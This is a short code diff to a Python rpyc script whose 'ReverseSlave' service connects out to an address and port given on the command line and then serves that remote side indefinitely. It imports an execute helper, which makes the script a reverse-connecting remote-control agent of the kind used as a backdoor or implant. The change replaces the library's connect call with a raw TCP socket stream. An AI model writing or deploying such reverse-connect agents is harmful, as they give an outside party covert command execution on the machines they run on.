@@ -1,8 +1,10 @@
 import os
+import socket
 import sys
 
 from rpyc.core.service import Service, ModuleNamespace
-from rpyc.utils.factory import connect
+from rpyc.utils.factory import connect_stream
+from rpyc.core.stream import SocketStream
 from rpyc.lib.compat import execute
 
 class ReverseSlave(Service):
@@ -58,7 +60,11 @@ def main():
         addr, port = sys.argv[1].split(":") 
 
         try:
-            conn = connect(addr, port, ReverseSlave)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((addr, int(port)))
+            stream = SocketStream(s)
+            conn = connect_stream(stream, ReverseSlave, {})
+            
             while True:
                conn.serve_all()
         except KeyboardInterrupt:
